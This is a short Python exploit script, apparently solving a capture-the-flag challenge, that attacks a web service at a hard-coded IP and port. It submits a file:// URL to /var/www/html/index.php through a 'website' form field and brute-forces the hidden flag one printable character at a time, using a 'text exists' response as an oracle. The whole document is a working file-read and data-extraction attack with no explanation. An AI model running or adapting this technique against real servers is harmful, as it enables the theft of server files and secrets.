import requests
import string

url = "http://95.179.217.17:30011/"
flag="riddler{"

while(True):
    for char in string.printable:
        r=requests.post(url, data={
        "website":"file:///var/www/html/index.php",
        "text":flag+char
        })
        if "Yes this text exists there" in r.text:
            flag = flag+char
            print(flag)


